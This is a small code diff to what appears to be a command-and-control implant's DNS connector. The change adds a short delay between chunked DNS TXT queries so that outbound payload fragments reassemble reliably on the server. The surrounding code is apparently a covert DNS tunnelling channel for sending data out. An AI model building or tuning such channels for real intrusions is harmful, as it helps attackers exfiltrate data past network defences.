@@ -555,6 +555,11 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             ULONG tmpSize = 0;
             DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize);
 
+            // Pacing: Add a small delay to mitigate UDP packet loss and throttling on uplink.
+            // Without this, rapid-fire DNS queries for multi-fragment payloads often result in
+            // dropped frames, causing reassembly failure on the server side.
+            ApiWin->Sleep(30);
+
             offset += chunk;
         }
         // 记录本次上行总量，供自适应 sleep 使用
